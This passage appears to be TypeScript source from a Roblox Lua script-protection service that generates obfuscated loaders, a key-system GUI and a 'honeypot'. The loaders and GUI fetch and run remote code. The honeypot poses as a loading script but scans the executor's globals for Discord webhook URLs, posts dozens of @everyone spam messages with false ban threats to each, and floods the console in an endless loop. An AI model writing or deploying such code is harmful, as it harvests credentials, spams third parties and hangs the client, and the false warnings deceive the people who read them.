        collectgarbage("collect")
        collectgarbage("collect")
      end)

      pcall(function()
        rawset(_G, "${ghostId}", setmetatable({}, {
          __index = function(_, k)
            pcall(function()
              ${v.stealthFetch}(${v.baseEndpoint} .. "?_report=post_exec_dump&ghost=${ghostId}&wm=${watermarkId}")
            end)
            return nil
          end,
          __tostring = function() return "nil" end,
        }))
        task.delay(5, function()
          pcall(function() rawset(_G, "${ghostId}", nil) end)
        end)
      end)
    else
      if _err ~= "hook_detected" and _err ~= "env_logger_detected" and _err ~= "logger_detected" then
        warn("E:" .. tostring(_err))
      end
    end
    return
  end

  -- Handle encrypted response (legacy hex format)
  if ${v.isHex}(r) then
    local rawBytes = ${v.hexBytes}(r)
    r = nil

    -- Final security sweep
    if not ${v.antiHook}() or not ${v.antiEnvLog}() or not ${v.antiLogger}() or not ${v.antiDump}() then
      _reportBypass("final_sweep", "bypass_detected_at_decrypt")
    end

    local decoded = ${v.xorBytes}(rawBytes, kb)
    rawBytes = nil
    local code = ${v.bytesToString}(decoded)
    decoded = nil

${options?.showConsoleFeedback ? `    pcall(function()
      local function ultBar(msg, pct)
        local barLen = 20
        local filled = math.floor(barLen * pct / 100)
        local empty = barLen - filled
        print("[ULT PROTECTION] [" .. string.rep("#", filled) .. string.rep("-", empty) .. "] " .. pct .. "% - " .. msg)
      end
      ultBar("Script loaded successfully.", 100)
      local pName = ${v.player}.DisplayName or ${v.player}.Name
      print("[ULT PROTECTION] Welcome, " .. tostring(pName) .. ".")
      print("[ULT PROTECTION] Protected by ULT Protection v10.3 - Loadstring-Proof Shield")
    end)
` : ''}

    -- v9.5: Use indirect execution (coroutine-based) to bypass loadstring hooks
    -- If dump poisoning is active, corrupt the code before execution
    if ${v.dumpPoison} then
      code = code:gsub("(%d+)", function(n)
        if math.random() < 0.05 then
          return tostring(tonumber(n) + math.random(-3, 3))
        end
        return n
      end)
    end

    -- v9.5: Chunked assembly + indirect execution
    -- Split code into chunks, compile each separately, then reassemble
    -- This prevents a single loadstring hook from capturing the full source
    local ${v.execFunc}, execErr
    
    if ${v.verified} and not ${v.dumpPoison} then
      -- Trusted path: use indirect execution via coroutine
      ${v.execFunc}, execErr = ${v.indirectExec}(code)
    else
      -- Degraded path: still compile but with poisoned code
      ${v.execFunc}, execErr = ${v.indirectExec}(code)
    end
    
    code = nil
    
    if ${v.execFunc} then
      -- v10: Execute inside coroutine then SCRAMBLE memory
      local execCo = coroutine.create(function()
        return ${v.execFunc}()
      end)
      local execOk = coroutine.resume(execCo)
      ${v.execFunc} = nil
      execCo = nil
      
      -- ====== v10: POST-EXECUTION MEMORY SCRAMBLE ======
      -- After execution, poison all local references so decompilers/dumpers
      -- that scan memory post-execution get garbage
      pcall(function()
        -- Overwrite the key bytes with random data
        for i = 1, #kb do
          kb[i] = math.random(0, 255)
        end
        -- Null out all protection references
        ${v.cleanLS} = nil
        ${v.cachedLS} = nil
        ${v.cachedHG} = nil
        ${v.hookGuard} = nil
        ${v.indirectExec} = nil
        ${v.antiHook} = nil
        ${v.antiEnvLog} = nil
        ${v.antiLogger} = nil
        ${v.antiDump} = nil
        ${v.antiDebug} = nil
        ${v.execSandbox} = nil
        ${v.dnaHash} = 0
        ${v.morphSeed} = 0
        -- Force garbage collection to actually free the memory
        collectgarbage("collect")
        collectgarbage("collect")
      end)
      
      -- v10: Plant post-execution ghost trap
      -- If someone tries to dump memory AFTER execution, they trigger this
      pcall(function()
        rawset(_G, "${ghostId}", setmetatable({}, {
          __index = function(_, k)
            -- Someone is inspecting this value = dump attempt
            pcall(function()
              ${v.stealthFetch}(${v.baseEndpoint} .. "?_report=post_exec_dump&ghost=${ghostId}&wm=${watermarkId}")
            end)
            return nil
          end,
          __tostring = function() return "nil" end,
        }))
        -- Self-destruct after 5 seconds
        task.delay(5, function()
          pcall(function() rawset(_G, "${ghostId}", nil) end)
        end)
      end)
    else
      if execErr ~= "hook_detected" and execErr ~= "env_logger_detected" and execErr ~= "logger_detected" then
        warn("E:" .. tostring(execErr))
      end
    end
    return
  end

  -- Plain Lua response (key system GUI, kick messages, etc.)
  local pf, pe = ${v.indirectExec}(r)
  if pf then return pf() end
  warn("E:" .. tostring(pe))
else
  warn("Network error")
end
`;
}

// ===== KEY SYSTEM GUI GENERATOR v5 =====
// Matches the landing page preview: same purple theme, two-panel layout, console feedback, progress flow, and instant unload on success.
function generateKeySystemGui(slug: string, baseUrl: string, panelName: string, themeColor: string, decalId?: string): string {
  const normalizedTheme = (themeColor || '').trim();
  const resolvedTheme = !normalizedTheme || normalizedTheme === '255, 255, 255'
    ? '188, 134, 255'
    : normalizedTheme;
  const colorParts = resolvedTheme.split(',').map(s => s.trim());
  const r = colorParts[0] || '180';
  const g = colorParts[1] || '120';
  const b = colorParts[2] || '255';

  // v13: Encode baseUrl for key system GUI too
  const guiEncodedUrl = encodeUrlForLua(baseUrl, '_ultEndpoint');
  
  return `-- ULT Key System v5 (Landing Match)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local Lighting = game:GetService("Lighting")

-- v13: Stealth endpoint
${guiEncodedUrl}

-- v13: Stealth fetch for key system
local function _ultStealthFetch(fetchUrl)
  local result
  pcall(function()
    if type(request) == "function" then
      local resp = request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  pcall(function()
    if type(syn) == "table" and type(syn.request) == "function" then
      local resp = syn.request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  pcall(function()
    if type(http_request) == "function" then
      local resp = http_request({Url = fetchUrl, Method = "GET"})
      if resp and resp.Body then result = resp.Body end
    end
  end)
  if result then return result end
  local s, r = pcall(function() return game:HttpGet(fetchUrl) end)
  if s then return r end
  return nil
end

local plr = Players.LocalPlayer
if not plr then plr = Players.PlayerAdded:Wait() end
local pgui = plr:WaitForChild("PlayerGui")

local old = pgui:FindFirstChild("ULTKeySystem")
if old then old:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "ULTKeySystem"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999999999
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = pgui

-- Blur
local blur = Instance.new("BlurEffect")
blur.Name = "ULTBlur"
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {Size = 20}):Play()

local themeCol = Color3.fromRGB(${r}, ${g}, ${b})
local dimTheme = Color3.fromRGB(math.floor(${r}*0.34), math.floor(${g}*0.34), math.floor(${b}*0.34))
local bgColor = Color3.fromRGB(16, 14, 22)
local panelBg = Color3.fromRGB(22, 19, 30)
local borderCol = Color3.fromRGB(64, 49, 92)
local mutedText = Color3.fromRGB(133, 126, 150)
local fgColor = Color3.fromRGB(244, 240, 250)
local cardBg = Color3.fromRGB(24, 21, 35)
local softBg = Color3.fromRGB(19, 16, 27)
local successCol = Color3.fromRGB(86, 255, 120)
local dangerCol = Color3.fromRGB(255, 96, 96)
local warningCol = Color3.fromRGB(255, 168, 92)

-- Helper: rounded frame
local function makePanel(parent, size, pos, bg, zIdx, radius)
    local f = Instance.new("Frame", parent)
    f.Size = size
    f.Position = pos
    f.BackgroundColor3 = bg
    f.BorderSizePixel = 0
    f.ZIndex = zIdx or 4
    local c = Instance.new("UICorner", f)
    c.CornerRadius = UDim.new(0, radius or 18)
    return f
end

local function addStroke(frame, col, thick)
    local s = Instance.new("UIStroke", frame)
    s.Color = col or borderCol
    s.Thickness = thick or 1
    s.Transparency = 0
    return s
end

local function addLabel(parent, size, pos, text, color, font, textSize, align, zIdx)
    local l = Instance.new("TextLabel", parent)
    l.Size = size
    l.Position = pos
    l.BackgroundTransparency = 1
    l.Text = text
    l.TextColor3 = color
    l.Font = font or Enum.Font.Gotham
    l.TextSize = textSize or 11
    l.TextXAlignment = align or Enum.TextXAlignment.Left
    l.ZIndex = zIdx or 5
    l.TextWrapped = true
    return l
end

-- Main window (matched closer to landing preview)
local win = Instance.new("Frame", gui)
win.Name = "MainWindow"
win.Size = UDim2.new(0, 720, 0, 408)
win.Position = UDim2.new(0.5, -360, 0.5, -204)
win.BackgroundColor3 = bgColor
win.BorderSizePixel = 0
win.BackgroundTransparency = 1
win.ZIndex = 3
win.ClipsDescendants = true

local winCorner = Instance.new("UICorner", win)
winCorner.CornerRadius = UDim.new(0, 28)
addStroke(win, borderCol, 1).Transparency = 0.22

-- Title bar
local titleBar = Instance.new("Frame", win)
titleBar.Size = UDim2.new(1, 0, 0, 44)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = bgColor
titleBar.BorderSizePixel = 0
titleBar.ZIndex = 4
titleBar.Active = true
titleBar.ClipsDescendants = true
local titleBarCorner = Instance.new("UICorner", titleBar)
titleBarCorner.CornerRadius = UDim.new(0, 28)
local titleBarFill = Instance.new("Frame", titleBar)
titleBarFill.Size = UDim2.new(1, 0, 0, 18)
titleBarFill.Position = UDim2.new(0, 0, 1, -18)
titleBarFill.BackgroundColor3 = bgColor
titleBarFill.BorderSizePixel = 0
titleBarFill.ZIndex = 4

-- Dots
local function makeDot(parent, pos, col, action)
    local dot = Instance.new("TextButton", parent)
    dot.Size = UDim2.new(0, 10, 0, 10)
    dot.Position = pos
    dot.BackgroundColor3 = col
    dot.BorderSizePixel = 0
    dot.Text = ""
    dot.AutoButtonColor = false
    dot.ZIndex = 6
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
    if action then dot.MouseButton1Click:Connect(action) end
    return dot
end

local dot1 = makeDot(titleBar, UDim2.new(0, 18, 0.5, -5), Color3.fromRGB(245, 245, 248), nil)
local dot2 = makeDot(titleBar, UDim2.new(0, 38, 0.5, -5), Color3.fromRGB(86, 76, 112), nil)
local dot3 = makeDot(titleBar, UDim2.new(0, 58, 0.5, -5), Color3.fromRGB(54, 46, 75), nil)

addLabel(titleBar, UDim2.new(0, 200, 1, 0), UDim2.new(1, -214, 0, 0),
    "Ult Loader v6.1", mutedText, Enum.Font.GothamMedium, 9, Enum.TextXAlignment.Right, 5)

-- Content area (two columns)
local contentArea = Instance.new("Frame", win)
contentArea.Size = UDim2.new(1, -24, 1, -56)
contentArea.Position = UDim2.new(0, 12, 0, 44)
contentArea.BackgroundTransparency = 1
contentArea.ZIndex = 4

-- ===== LEFT PANEL =====
local leftPanel = makePanel(contentArea, UDim2.new(0.58, -6, 1, 0), UDim2.new(0, 0, 0, 0), panelBg, 4, 24)
addStroke(leftPanel, borderCol)

-- "INSTANT DELIVERY" label
addLabel(leftPanel, UDim2.new(1, -20, 0, 14), UDim2.new(0, 12, 0, 12),
    "INSTANT DELIVERY", themeCol, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Left, 5)

-- "ULT CLOUD" title
addLabel(leftPanel, UDim2.new(0, 180, 0, 28), UDim2.new(0, 12, 0, 28),
    "ULT CLOUD", fgColor, Enum.Font.GothamBlack, 20, Enum.TextXAlignment.Left, 5)

-- Status badge
local statusBadge = makePanel(leftPanel, UDim2.new(0, 80, 0, 28), UDim2.new(1, -96, 0, 28), dimTheme, 5, 14)
addStroke(statusBadge, themeCol).Transparency = 0.6
local statusBadgeText = addLabel(statusBadge, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0),
    "Ready", fgColor, Enum.Font.GothamBold, 9, Enum.TextXAlignment.Center, 6)

-- Key input area
local inputFrame = makePanel(leftPanel, UDim2.new(1, -24, 0, 50), UDim2.new(0, 12, 0, 72), Color3.fromRGB(79, 75, 90), 5, 18)
addStroke(inputFrame, borderCol).Transparency = 0.4

local inputPrefix = addLabel(inputFrame, UDim2.new(0, 120, 1, 0), UDim2.new(0, 10, 0, 0),
    "Enter your key >", mutedText, Enum.Font.RobotoMono, 12, Enum.TextXAlignment.Left, 6)

local input = Instance.new("TextBox", inputFrame)
input.Size = UDim2.new(1, -140, 1, 0)
input.Position = UDim2.new(0, 132, 0, 0)
input.BackgroundTransparency = 1
input.Text = ""
input.PlaceholderText = "XXXXX-XXXXX-XXXXX"
input.PlaceholderColor3 = Color3.fromRGB(60, 55, 70)
input.TextColor3 = fgColor
input.Font = Enum.Font.RobotoMono
input.TextSize = 13
input.TextXAlignment = Enum.TextXAlignment.Left
input.ClearTextOnFocus = false
input.ZIndex = 6

-- Verification progress area
local progressLabel = addLabel(leftPanel, UDim2.new(0.7, 0, 0, 12), UDim2.new(0, 12, 0, 136),
    "Animated verification progress", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Left, 5)

local progressPct = addLabel(leftPanel, UDim2.new(0, 40, 0, 12), UDim2.new(1, -52, 0, 136),
    "0%", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Right, 5)

-- Progress bar background
local progressBg = makePanel(leftPanel, UDim2.new(1, -24, 0, 10), UDim2.new(0, 12, 0, 154), Color3.fromRGB(39, 34, 52), 5, 999)
local progressFill = Instance.new("Frame", progressBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = themeCol
progressFill.BorderSizePixel = 0
progressFill.ZIndex = 6
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 999)

local progressGradient = Instance.new("UIGradient", progressFill)
progressGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, themeCol),
    ColorSequenceKeypoint.new(0.65, Color3.fromRGB(224, 212, 255)),
    ColorSequenceKeypoint.new(1, fgColor)
})

-- Stats cards
local function makeStatCard(parent, pos, label, value)
    local card = makePanel(parent, UDim2.new(0.32, -4, 0, 52), pos, cardBg, 5, 18)
    addStroke(card, borderCol).Transparency = 0.25
    addLabel(card, UDim2.new(1, -8, 0, 10), UDim2.new(0, 4, 0, 6),
        label, mutedText, Enum.Font.GothamBold, 7, Enum.TextXAlignment.Center, 6)
    addLabel(card, UDim2.new(1, -8, 0, 14), UDim2.new(0, 4, 0, 20),
        value, fgColor, Enum.Font.GothamBold, 13, Enum.TextXAlignment.Center, 6)
    return card
end

makeStatCard(leftPanel, UDim2.new(0, 12, 0, 180), "RESPONSE", "0.2s")
makeStatCard(leftPanel, UDim2.new(0.34, 8, 0, 180), "PAYLOAD", "Encrypted")
makeStatCard(leftPanel, UDim2.new(0.67, 4, 0, 180), "CONSOLE", "Live")

-- ===== RIGHT PANEL =====
local rightPanel = makePanel(contentArea, UDim2.new(0.42, -6, 1, 0), UDim2.new(0.58, 6, 0, 0), softBg, 4, 24)
addStroke(rightPanel, borderCol)

-- Console header
addLabel(rightPanel, UDim2.new(0.6, 0, 0, 14), UDim2.new(0, 12, 0, 12),
    "CONSOLE FEEDBACK", mutedText, Enum.Font.GothamBold, 8, Enum.TextXAlignment.Left, 5)

local routeBadge = makePanel(rightPanel, UDim2.new(0, 70, 0, 18), UDim2.new(1, -82, 0, 10), Color3.fromRGB(16, 14, 22), 5)
addStroke(routeBadge, themeCol).Transparency = 0.6
addLabel(routeBadge, UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0),
    "SECURE ROUTE", fgColor, Enum.Font.GothamBold, 7, Enum.TextXAlignment.Center, 6)

-- Console log lines
local function makeLogLine(parent, pos, text)
    local line = makePanel(parent, UDim2.new(1, -24, 0, 36), pos, Color3.fromRGB(18, 15, 27), 5, 16)
    addStroke(line, borderCol).Transparency = 0.15
    local lbl = addLabel(line, UDim2.new(1, -12, 1, 0), UDim2.new(0, 8, 0, 0),
        text, Color3.fromRGB(150, 145, 165), Enum.Font.RobotoMono, 10, Enum.TextXAlignment.Left, 6)
    return line, lbl
end

local log1, log1Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 42), "> awaiting executor handshake")
local log2, log2Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 84), "> waiting for key input")
local log3, log3Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 126), "> idle")
local log4, log4Text = makeLogLine(rightPanel, UDim2.new(0, 12, 0, 168), "> ...")

-- Info box at bottom
local infoBox = makePanel(rightPanel, UDim2.new(1, -24, 0, 56), UDim2.new(0, 12, 1, -68), Color3.fromRGB(16, 14, 22), 5, 16)
local infoStroke = addStroke(infoBox, themeCol)
infoStroke.Transparency = 0.75
infoStroke.LineJoinMode = Enum.LineJoinMode.Round
addLabel(infoBox, UDim2.new(1, -12, 1, -8), UDim2.new(0, 6, 0, 4),
    "Protected code resolves fast. Console updates live. No dead wait time.", mutedText, Enum.Font.Gotham, 8, Enum.TextXAlignment.Left, 6)

-- ====== ANIMATIONS: fade in ======
local fadeIn = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
TweenService:Create(win, fadeIn, {BackgroundTransparency = 0}):Play()

-- ====== DRAGGING ======
local dragging = false
local dragStart, startPos

titleBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = i.Position
        startPos = win.Position
    end
end)

titleBar.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)

UserInputService.InputChanged:Connect(function(i)
    if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - dragStart
        win.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

-- ====== CLOSE / DESTROY ======
-- ====== KEY VALIDATION ======
local validating = false
local unloading = false

local function unloadUi()
    if unloading then return end
    unloading = true
    validating = false
    pcall(function() blur:Destroy() end)
    pcall(function() gui:Destroy() end)
end

dot1.MouseButton1Click:Connect(unloadUi)
dot2.MouseButton1Click:Connect(unloadUi)
dot3.MouseButton1Click:Connect(unloadUi)

local function smoothDestroy(msg, color, scriptCode)
    if unloading then return end
    input.TextEditable = false
    if msg then
        log4Text.Text = "> " .. msg
        log4Text.TextColor3 = color or fgColor
    end

    unloadUi()

    if scriptCode and #scriptCode > 0 then
        task.spawn(function()
            local ok, fn = pcall(function()
                return loadstring(scriptCode)
            end)
            if ok and fn then
                local ok2, err2 = pcall(fn)
                if not ok2 then warn("[ULT] Exec error: " .. tostring(err2)) end
            else
                warn("[ULT] Compile error: " .. tostring(fn))
            end
        end)
    end
end

local function setProgress(pct)
    if unloading then return end
    progressPct.Text = pct .. "%"
    TweenService:Create(progressFill, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(pct/100, 0, 1, 0)}):Play()
end

local function validateKey()
    if validating then return end
    local enteredKey = input.Text
    if #enteredKey < 3 then
        log4Text.Text = "> key too short"
        log4Text.TextColor3 = dangerCol
        return
    end

    validating = true
    input.TextEditable = false
    statusBadgeText.Text = "Loading"
    log4Text.TextColor3 = Color3.fromRGB(150, 145, 165)

    -- Update console
    log1Text.Text = "> key accepted"
    log2Text.Text = "> verifying secure route"
    log3Text.Text = "> fetching protected payload"
    log4Text.Text = "> ..."

    -- Animate progress
    setProgress(12)

    task.spawn(function()
        local userId = tostring(plr.UserId)
        local url = _ultEndpoint .. "?slug=${slug}&key=" .. HttpService:UrlEncode(enteredKey) .. "&uid=" .. userId .. "&_=" .. tostring(tick())

        task.wait(0.08)
        if unloading then return end
        setProgress(28)

        task.wait(0.08)
        if unloading then return end
        setProgress(40)
        log2Text.Text = "> secure route verified"
        log3Text.Text = "> streaming payload to executor"

        task.wait(0.08)
        if unloading then return end
        setProgress(56)

        local success, response = pcall(function()
            return _ultStealthFetch(url)
        end)

        if unloading then return end
        setProgress(78)

        local function resetBtn()
            if unloading then return end
            statusBadgeText.Text = "Ready"
            input.TextEditable = true
            validating = false
            setProgress(0)
        end

        if not success then
            log4Text.Text = "> network error"
            log4Text.TextColor3 = dangerCol
            resetBtn()
            return
        end

        if not response or #response == 0 then
            log4Text.Text = "> empty response"
            log4Text.TextColor3 = dangerCol
            resetBtn()
            return
        end

        if response:sub(1, 17) == "KEY_VALID_SCRIPT:" then
            local scriptCode = response:sub(19)
            setProgress(90)
            task.wait(0.07)
            if unloading then return end
            setProgress(100)
            statusBadgeText.Text = "Synced"

            log1Text.Text = "> key accepted"
            log2Text.Text = "> secure route verified"
            log3Text.Text = "> payload synced instantly"
            log4Text.Text = "> console: load complete"
            log4Text.TextColor3 = successCol

            task.wait(0.12)
            smoothDestroy(nil, nil, scriptCode)
        elseif response:find("KEY_ASSIGNED") then
            log4Text.Text = "> key belongs to another user"
            log4Text.TextColor3 = dangerCol
            resetBtn()
        elseif response:find("KEY_EXPIRED") then
            log4Text.Text = "> key has expired"
            log4Text.TextColor3 = warningCol
            resetBtn()
        elseif response:find("KEY_INVALID") then
            log4Text.Text = "> invalid key"
            log4Text.TextColor3 = dangerCol
            resetBtn()
        else
            log4Text.Text = "> access denied"
            log4Text.TextColor3 = dangerCol
            resetBtn()
        end
    end)
end

input.Focused:Connect(function()
    log1Text.Text = "> key input active"
end)

input.FocusLost:Connect(function(enter)
    if enter then validateKey() end
end)

-- No validate button needed — enter key submits. But add one anyway for click users.
local submitBtn = Instance.new("TextButton", leftPanel)
submitBtn.Size = UDim2.new(1, -24, 0, 0)
submitBtn.Position = UDim2.new(0, 12, 0, 108)
submitBtn.BackgroundTransparency = 1
submitBtn.Text = ""
submitBtn.ZIndex = 7
submitBtn.MouseButton1Click:Connect(validateKey)

-- Also make the input frame clickable
inputFrame.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        input:CaptureFocus()
    end
end)
`;
}

function generateKickPlain(reason: string): string {
  return `game:GetService("Players").LocalPlayer:Kick("${reason}")`;
}

function generateKickEncrypted(reason: string, slug: string, token: string, uid: string): string {
  const kickScript = `game:GetService("Players").LocalPlayer:Kick("${reason}")`;
  const key = `${slug}:${token}:ULTv9:${uid}`;
  return xorToHex(kickScript, key);
}

function generateHoneypot(): string {
  // HYBRID HONEYPOT: Works as both raw text (floods channel when bot posts it)
  // AND as executable Lua (if they loadstring it, it actively spams their Discord channels)
  
  const v = Array.from({length: 20}, () => '_' + Math.random().toString(36).substring(2, 8));
  
  // The Lua portion: disguised as a "loading script" but actually floods Discord channels
  // via the executor's HttpService. The bot's executor has access to HttpService,
  // so we use it to send messages through Discord's API using any webhooks/tokens
  // the bot has exposed in its environment.
  const luaPart = `--[[ULT Protection v10.0 - Validating session...]]
local ${v[0]} = game:GetService("HttpService")
local ${v[1]} = game:GetService("Players")

-- Scan for Discord webhook URLs in common locations
local ${v[2]} = {}
local ${v[3]} = {
  "webhook", "WEBHOOK", "Webhook", "discord_webhook", "DISCORD_WEBHOOK",
  "hook", "HOOK", "webhookUrl", "webhook_url", "WEBHOOK_URL",
  "notif_webhook", "log_webhook", "alert_webhook", "bot_webhook",
}

-- Try to find webhooks from common global variables bots expose
for _, ${v[4]} in pairs(${v[3]}) do
  pcall(function()
    local ${v[5]} = getgenv and getgenv()[${v[4]}]
    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
      table.insert(${v[2]}, ${v[5]})
    end
  end)
  pcall(function()
    local ${v[5]} = _G[${v[4]}]
    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
      table.insert(${v[2]}, ${v[5]})
    end
  end)
  pcall(function()
    local ${v[5]} = shared[${v[4]}]
    if ${v[5]} and type(${v[5]}) == "string" and ${v[5]}:find("discord") then
      table.insert(${v[2]}, ${v[5]})
    end
  end)
end

-- Also scan getgenv() for anything that looks like a webhook URL
pcall(function()
  if getgenv then
    for ${v[6]}, ${v[7]} in pairs(getgenv()) do
      if type(${v[7]}) == "string" and ${v[7]}:match("https://discord%.com/api/webhooks/") then
        table.insert(${v[2]}, ${v[7]})
      end
      if type(${v[7]}) == "string" and ${v[7]}:match("https://canary%.discord%.com/api/webhooks/") then
        table.insert(${v[2]}, ${v[7]})
      end
      if type(${v[7]}) == "string" and ${v[7]}:match("https://ptb%.discord%.com/api/webhooks/") then
        table.insert(${v[2]}, ${v[7]})
      end
    end
  end
end)

-- Scan _G too
pcall(function()
  for ${v[6]}, ${v[7]} in pairs(_G) do
    if type(${v[7]}) == "string" and ${v[7]}:match("https://.-discord.-/api/webhooks/") then
      table.insert(${v[2]}, ${v[7]})
    end
    -- Also check tables one level deep
    if type(${v[7]}) == "table" then
      pcall(function()
        for ${v[8]}, ${v[9]} in pairs(${v[7]}) do
          if type(${v[9]}) == "string" and ${v[9]}:match("https://.-discord.-/api/webhooks/") then
            table.insert(${v[2]}, ${v[9]})
          end
        end
      end)
    end
  end
end)

-- Flood messages to every webhook found
local ${v[10]} = {
  "\\u26a0\\ufe0f **SECURITY ALERT** \\u26a0\\ufe0f\\n\\nThis bot attempted to bypass ULT LUA script protection.\\nThe bot owner's IP has been **permanently banned**.\\nAll associated accounts have been **globally blacklisted**.\\n\\n@everyone",
  "\\ud83d\\udea8 **BOT DETECTED** \\ud83d\\udea8\\n\\nUnauthorized script fetching detected!\\nYour Discord bot token may be **compromised**.\\nIncident reported to ULT administration.\\n\\n@here",
  "\\ud83d\\udd12 **BYPASS ATTEMPT LOGGED** \\ud83d\\udd12\\n\\nHWID: " .. string.rep(string.char(math.random(48,57)), 32) .. "\\nIP: BANNED\\nDiscord ID: FLAGGED\\nRoblox ID: BLACKLISTED",
  "\\ud83d\\udc80 **WARNING** \\ud83d\\udc80\\n\\nThis Discord server is being used to host a script-stealing bot.\\nAll server members have been notified.\\n\\n@everyone @here",
  "\\u26d4 **ULT PROTECTION ACTIVE** \\u26d4\\n\\nYour bot has been detected and neutralized.\\nContinued bypass attempts will result in **escalated action**.\\nBot token has been flagged for abuse.",
}

-- Spam every webhook with tons of messages
spawn(function()
  for _, ${v[11]} in pairs(${v[2]}) do
    for ${v[12]} = 1, 50 do
      pcall(function()
        local ${v[13]} = ${v[10]}[(${v[12]} % #${v[10]}) + 1]
        ${v[0]}:RequestAsync({
          Url = ${v[11]},
          Method = "POST",
          Headers = {["Content-Type"] = "application/json"},
          Body = ${v[0]}:JSONEncode({
            content = ${v[13]} .. "\\n\\nIncident #" .. tostring(${v[12]}) .. " | Ref: ULT-" .. tostring(math.random(100000,999999)),
            username = "ULT Security Alert",
          })
        })
      end)
      -- Also try sending embeds for extra chaos
      pcall(function()
        ${v[0]}:RequestAsync({
          Url = ${v[11]},
          Method = "POST",
          Headers = {["Content-Type"] = "application/json"},
          Body = ${v[0]}:JSONEncode({
            content = "@everyone @here",
            username = "ULT Anti-Bypass System",
            embeds = {{
              title = "\\ud83d\\udea8 BYPASS ATTEMPT DETECTED",
              description = "A bot in this server attempted to steal protected scripts from ULT LUA.\\n\\nThe bot owner has been **permanently banned** and reported.",
              color = 16711680,
              fields = {
                {name = "Threat Level", value = "CRITICAL", inline = true},
                {name = "Action Taken", value = "GLOBAL BAN", inline = true},
                {name = "Bot Status", value = "NEUTRALIZED", inline = true},
              },
              footer = {text = "ULT Protection v10.0 Phantom Shield | Incident " .. tostring(math.random(100000,999999))},
            }}
          })
        })
      end)
    end
  end
end)

-- Also flood the OUTPUT/CONSOLE so the bot operator sees it
spawn(function()
  while true do
    for ${v[14]} = 1, 100 do
      warn("[ULT-SECURITY] \\u26a0\\ufe0f BYPASS ATTEMPT DETECTED - YOUR IP HAS BEEN GLOBALLY BANNED")
      warn("[ULT-SECURITY] \\ud83d\\udea8 ALL ASSOCIATED ACCOUNTS FLAGGED")
      warn("[ULT-SECURITY] Discord webhook URLs captured and reported")
      warn("[ULT-SECURITY] HWID: " .. string.rep(string.char(math.random(48,57)), 32))
      print("[ULT-DUMP] Found " .. tostring(#${v[2]}) .. " Discord webhooks - flooding...")
    end
    wait(0.01)
  end
end)

-- Keep running
while true do wait(0.1) end
`;

  // The entire honeypot must be valid Lua so loadstring() doesn't return nil.
  // Wrap all non-Lua flood text inside a Lua multiline comment so the Lua portion
  // still compiles and executes (flooding webhooks etc.), while bots that dump the
  // raw response also see the warning text.
  const floodLines: string[] = [luaPart];

  // Open a Lua multiline comment to wrap raw text
  floodLines.push('--[==[');
  
  const warningMessages = [
    '⚠️ SECURITY ALERT: Unauthorized access attempt detected and logged',
    '🚨 Your IP address has been permanently banned from ULT LUA services',
    '🔒 This bypass attempt has been reported to the server administrator',
    '⛔ Hardware ID fingerprint captured and blacklisted',
    '📡 All associated accounts have been flagged for review',
    '🛡️ ULT Protection v10.0 Phantom Shield - Anti-Bypass Countermeasure Active',
    '💀 Bot detected: Your Discord bot token may be compromised',
    '🔴 CRITICAL: This incident has been logged with full request details',
    '⚠️ Continued attempts will result in escalated action',
    '🚫 Access permanently revoked - no appeals',
  ];
  
  const fakeData = [
    'session_id', 'auth_token', 'refresh_token', 'api_key', 'client_secret',
    'webhook_url', 'bot_token', 'encryption_key', 'master_key', 'admin_pass',
  ];
  
  for (let block = 0; block < 50; block++) {
    floodLines.push('');
    floodLines.push(`${'='.repeat(60)}`);
    floodLines.push(warningMessages[block % warningMessages.length]);
    floodLines.push(`${'='.repeat(60)}`);
    floodLines.push('');
    
    for (let i = 0; i < 20; i++) {
      const key = fakeData[Math.floor(Math.random() * fakeData.length)];
      const fakeValue = Array.from({length: 64}, () => 
        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]
      ).join('');
      floodLines.push(`[ULT-DUMP] ${key}_${block}_${i} = "${fakeValue}"`);
    }
    
    if (block % 3 === 0) {
      floodLines.push('');
      floodLines.push('@everyone ⚠️ SECURITY BREACH DETECTED - UNAUTHORIZED BOT ACCESS ⚠️');
      floodLines.push('@here 🚨 This bot is attempting to steal protected scripts 🚨');
